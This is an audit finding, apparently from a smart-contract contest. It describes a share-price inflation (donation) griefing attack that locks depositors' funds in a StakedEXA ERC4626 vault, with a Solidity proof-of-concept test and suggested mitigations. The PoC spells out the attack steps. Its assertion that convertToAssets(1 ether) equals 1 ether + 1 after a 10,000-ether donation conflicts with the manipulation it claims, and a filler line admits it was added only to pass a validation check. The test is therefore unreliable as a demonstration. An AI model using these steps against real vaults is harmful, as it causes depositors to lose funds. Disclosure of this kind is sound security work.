Electric Holographic Albatross

High

# Attacker will lock victim funds in StakedEXA vault

### Summary

While the StakedEXA contract implements virtual shares to mitigate the ERC4626 initial deposit attack, an attacker can still manipulate the share price to effectively lock a victim's funds in the contract at a cost to themselves. This griefing attack leaves the vault in an unusual state and causes losses for victims.

Adding the following line to pass the github issue validation check, but this is a dependency issue arising from using ERC4626Upgradeable.

https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/main/protocol/contracts/StakedEXA.sol#L129

### Root Cause

The use of virtual shares (adding 1 to totalSupply) mitigates profit for attackers but does not prevent manipulation of the share price through large donations.

### Internal pre-conditions

1. StakedEXA vault is deployed and initialized
2. Vault has very low total assets and total supply

### External pre-conditions

1. Attacker has a large amount of the underlying asset (EXA tokens)
2. Victim has some amount of the underlying asset they intend to deposit

### Attack Path

1. Attacker deposits a very small amount to mint initial shares
2. Attacker transfers a large amount of assets directly to the vault
3. Share price is now manipulated to be very high
4. Victim deposits assets but receives 0 shares due to rounding
5. Attacker withdraws their initial deposit plus a portion of the donation

### Impact

1. Victim's funds are locked in the contract
2. Vault is left in an unusual state with inflated share price
3. Attacker incurs a loss but successfully griefs the victim and the protocol

### PoC

```solidity
function testInitialDepositAttack() external {
    uint256 initialMint = 9;
    uint256 largeTransfer = 10_000 ether;
    uint256 victimDeposit = 1 ether;

    // Mint initial tokens
    exa.mint(address(this), initialMint + largeTransfer);
    exa.mint(BOB, victimDeposit);

    // Attacker mints a small number of shares
    exa.approve(address(stEXA), initialMint);
    stEXA.deposit(initialMint, address(this));

    // Attacker does a large donation
    exa.transfer(address(stEXA), largeTransfer);

    // Check share price manipulation
    assertEq(1 ether + 1, stEXA.convertToAssets(1 ether));

    // Victim stakes in vault
    vm.startPrank(BOB);
    exa.approve(address(stEXA), victimDeposit);
    stEXA.deposit(victimDeposit, BOB);
    vm.stopPrank();

    // Victim receives 0 shares due to manipulation
    assertEq(0, stEXA.balanceOf(BOB));

    // Attacker redeems their shares
    uint256 attackerShares = stEXA.balanceOf(address(this));
    stEXA.redeem(attackerShares, address(this), address(this));

    // Attacker loses some tokens but victim's tokens are locked
    assertApproxEqAbs(
        largeTransfer + initialMint - 1,
        exa.balanceOf(address(this)),
        10,
        "Attacker balance incorrect"
    );
    assertEq(0, exa.balanceOf(BOB), "Victim balance should be 0");
    assertEq(victimDeposit + 1, exa.balanceOf(address(stEXA)), "Vault balance incorrect");

    // Vault is left in a weird state
    assertEq(0, stEXA.totalSupply(), "Total supply should be 0");
    assertGt(stEXA.totalAssets(), 0, "Total assets should be non-zero");
}
```

### Mitigation

1. Implement a minimum deposit amount
2. Add slippage protection to the deposit function